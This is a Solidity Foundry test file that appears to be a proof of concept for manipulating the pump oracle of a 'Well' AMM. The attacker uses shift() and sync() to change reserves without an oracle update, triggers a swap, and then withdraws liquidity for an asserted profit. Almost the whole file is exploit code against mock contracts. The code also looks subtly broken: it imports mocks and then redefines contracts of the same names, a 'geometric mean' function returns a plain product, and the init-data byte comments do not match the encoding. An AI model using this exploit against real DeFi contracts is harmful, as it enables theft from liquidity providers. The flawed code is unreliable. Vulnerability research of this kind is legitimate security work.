// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import {Test, console} from "forge-std/Test.sol";
import {Well} from "../../src/Well.sol";
import {ClonePlus} from "../../src/utils/ClonePlus.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {MockWellFunction} from "../mocks/MockWellFunction.sol";
import {MockPump} from "../mocks/MockPump.sol";
import {IWell} from "../../src/interfaces/IWell.sol";
import {IERC20} from "oz/token/ERC20/IERC20.sol";

contract ExploitTest is Test {
    Well well;
    MockERC20 token0;
    MockERC20 token1;
    MockWellFunction wellFunction;
    MockPump pump;
    ClonePlus cloner;
    
    address attacker = address(0x1);
    address user = address(0x2);
    
    event PumpUpdated(uint256[] reserves, bytes data);

    function setUp() public {
        // Deploy mock tokens
        token0 = new MockERC20("Token0", "T0");
        token1 = new MockERC20("Token1", "T1");
        
        // Deploy mock well function and pump
        wellFunction = new MockWellFunction();
        pump = new MockPump();
        
        // Deploy cloner for creating Well instance
        cloner = new ClonePlus();
        
        // Prepare initialization data for Well
        bytes memory initData = _buildWellInitData();
        
        // Clone Well with initialization data
        address wellAddress = cloner.clone(address(new Well()), initData);
        well = Well(payable(wellAddress));
        
        // Initialize the Well
        well.init("Well LP Token", "WELL");
        
        // Provide initial liquidity
        uint256 initialLiquidity = 1000e18;
        token0.mint(address(this), initialLiquidity * 2);
        token1.mint(address(this), initialLiquidity * 2);
        
        token0.approve(address(well), initialLiquidity * 2);
        token1.approve(address(well), initialLiquidity * 2);
        
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = initialLiquidity;
        amounts[1] = initialLiquidity;
        well.addLiquidity(amounts, 0, address(this), block.timestamp + 100);
        
        // Give attacker some tokens for the exploit
        token0.mint(attacker, 100e18);
        token1.mint(attacker, 100e18);
        
        vm.startPrank(attacker);
        token0.approve(address(well), 100e18);
        token1.approve(address(well), 100e18);
        vm.stopPrank();
    }

    function test_ShiftManipulatesPumpOracle() public {
        // Record initial pump state
        uint256[] memory initialReserves = well.getReserves();
        uint256 initialPumpValue = pump.getLastUpdatedValue();
        
        console.log("Initial reserves:", initialReserves[0], initialReserves[1]);
        console.log("Initial pump value:", initialPumpValue);
        
        // Step 1: Attacker performs shift to manipulate reserves
        vm.startPrank(attacker);
        
        // First, add some liquidity to have tokens to shift
        uint256[] memory addAmounts = new uint256[](2);
        addAmounts[0] = 10e18;
        addAmounts[1] = 10e18;
        well.addLiquidity(addAmounts, 0, attacker, block.timestamp + 100);
        
        // Now perform shift to manipulate reserves
        // This will update reserves without updating the pump
        uint256 shiftAmount = well.getShiftOut(token0);
        well.shift(token0, shiftAmount, attacker);
        
        vm.stopPrank();
        
        // Check that reserves were manipulated
        uint256[] memory manipulatedReserves = well.getReserves();
        console.log("Reserves after shift:", manipulatedReserves[0], manipulatedReserves[1]);
        
        // Pump should still have old value
        uint256 pumpValueAfterShift = pump.getLastUpdatedValue();
        console.log("Pump value after shift:", pumpValueAfterShift);
        assertEq(pumpValueAfterShift, initialPumpValue, "Pump should not be updated by shift");
        
        // Step 2: Perform a swap which will update the pump with manipulated reserves
        vm.startPrank(attacker);
        
        // Swap back some tokens to trigger pump update
        uint256 swapAmount = 1e18;
        well.swapFrom(token0, token1, swapAmount, 0, attacker, block.timestamp + 100);
        
        vm.stopPrank();
        
        // Now the pump should be updated with manipulated reserves
        uint256 pumpValueAfterSwap = pump.getLastUpdatedValue();
        console.log("Pump value after swap:", pumpValueAfterSwap);
        
        // The pump value should be different from initial, showing manipulation
        assertTrue(pumpValueAfterSwap != initialPumpValue, "Pump value should be manipulated");
        
        // Step 3: Verify attacker can extract funds without loss
        uint256 attackerToken0Before = token0.balanceOf(attacker);
        uint256 attackerToken1Before = token1.balanceOf(attacker);
        
        vm.startPrank(attacker);
        
        // Remove all liquidity to extract funds
        uint256 lpBalance = well.balanceOf(attacker);
        well.removeLiquidity(lpBalance, new uint256[](2), attacker, block.timestamp + 100);
        
        vm.stopPrank();
        
        uint256 attackerToken0After = token0.balanceOf(attacker);
        uint256 attackerToken1After = token1.balanceOf(attacker);
        
        console.log("Attacker token0 balance before:", attackerToken0Before);
        console.log("Attacker token0 balance after:", attackerToken0After);
        console.log("Attacker token1 balance before:", attackerToken1Before);
        console.log("Attacker token1 balance after:", attackerToken1After);
        
        // Attacker should have more tokens than before (profit from manipulation)
        assertTrue(attackerToken0After > attackerToken0Before || attackerToken1After > attackerToken1Before, 
                  "Attacker should profit from manipulation");
    }

    function test_SyncManipulatesPumpOracle() public {
        // Record initial pump state
        uint256[] memory initialReserves = well.getReserves();
        uint256 initialPumpValue = pump.getLastUpdatedValue();
        
        console.log("Initial reserves:", initialReserves[0], initialReserves[1]);
        console.log("Initial pump value:", initialPumpValue);
        
        // Step 1: Manipulate token balances directly
        uint256 manipulationAmount = 50e18;
        token0.mint(address(well), manipulationAmount);
        
        // Step 2: Call sync to update reserves to manipulated balances
        well.sync();
        
        // Check that reserves were manipulated
        uint256[] memory manipulatedReserves = well.getReserves();
        console.log("Reserves after sync:", manipulatedReserves[0], manipulatedReserves[1]);
        
        // Pump should still have old value
        uint256 pumpValueAfterSync = pump.getLastUpdatedValue();
        console.log("Pump value after sync:", pumpValueAfterSync);
        assertEq(pumpValueAfterSync, initialPumpValue, "Pump should not be updated by sync");
        
        // Step 3: Perform a swap which will update the pump with manipulated reserves
        vm.startPrank(attacker);
        
        // Swap tokens to trigger pump update
        uint256 swapAmount = 1e18;
        well.swapFrom(token0, token1, swapAmount, 0, attacker, block.timestamp + 100);
        
        vm.stopPrank();
        
        // Now the pump should be updated with manipulated reserves
        uint256 pumpValueAfterSwap = pump.getLastUpdatedValue();
        console.log("Pump value after swap:", pumpValueAfterSwap);
        
        // The pump value should be different from initial, showing manipulation
        assertTrue(pumpValueAfterSwap != initialPumpValue, "Pump value should be manipulated");
    }

    function _buildWellInitData() internal view returns (bytes memory) {
        // Build the initialization data for Well clone
        // This includes tokens, well function, and pumps configuration
        bytes memory data = new bytes(0);
        
        // Aquifer address (20 bytes)
        data = abi.encodePacked(data, address(0));
        
        // Number of tokens (32 bytes)
        data = abi.encodePacked(data, uint256(2));
        
        // Well function address (20 bytes)
        data = abi.encodePacked(data, address(wellFunction));
        
        // Well function data length (32 bytes)
        data = abi.encodePacked(data, uint256(0));
        
        // Number of pumps (32 bytes)
        data = abi.encodePacked(data, uint256(1));
        
        // Token addresses (2 * 32 bytes)
        data = abi.encodePacked(data, address(token0), address(token1));
        
        // Well function data (0 bytes)
        
        // Pump address (20 bytes)
        data = abi.encodePacked(data, address(pump));
        
        // Pump data length (32 bytes)
        data = abi.encodePacked(data, uint256(0));
        
        // Pump data (0 bytes)
        
        return data;
    }
}

// Mock contracts for testing

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }
    
    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract MockWellFunction {
    function calcLpTokenSupply(uint256[] memory reserves, bytes calldata) external pure returns (uint256) {
        // Simple geometric mean for LP token calculation
        uint256 product = 1;
        for (uint256 i = 0; i < reserves.length; i++) {
            product *= reserves[i];
        }
        return product;
    }
    
    function calcReserve(uint256[] memory reserves, uint256 j, uint256 lpTokenSupply, bytes calldata) external pure returns (uint256) {
        // Simple inverse calculation
        uint256 product = 1;
        for (uint256 i = 0; i < reserves.length; i++) {
            if (i != j) {
                product *= reserves[i];
            }
        }
        return lpTokenSupply / product;
    }
    
    function calcLPTokenUnderlying(uint256 lpAmount, uint256[] memory reserves, uint256 lpTokenSupply, bytes calldata) external pure returns (uint256[] memory) {
        uint256[] memory amounts = new uint256[](reserves.length);
        for (uint256 i = 0; i < reserves.length; i++) {
            amounts[i] = (reserves[i] * lpAmount) / lpTokenSupply;
        }
        return amounts;
    }
}

contract MockPump {
    uint256 public lastUpdatedValue;
    uint256[] public lastUpdatedReserves;
    
    event Update(uint256[] reserves, bytes data);
    
    function update(uint256[] memory reserves, bytes calldata) external {
        lastUpdatedReserves = reserves;
        // Simple oracle value based on reserve ratio
        if (reserves.length >= 2) {
            lastUpdatedValue = (reserves[0] * 1000) / reserves[1];
        }
        emit Update(reserves, "");
    }
    
    function getLastUpdatedValue() external view returns (uint256) {
        return lastUpdatedValue;
    }
    
    function getLastUpdatedReserves() external view returns (uint256[] memory) {
        return lastUpdatedReserves;
    }
}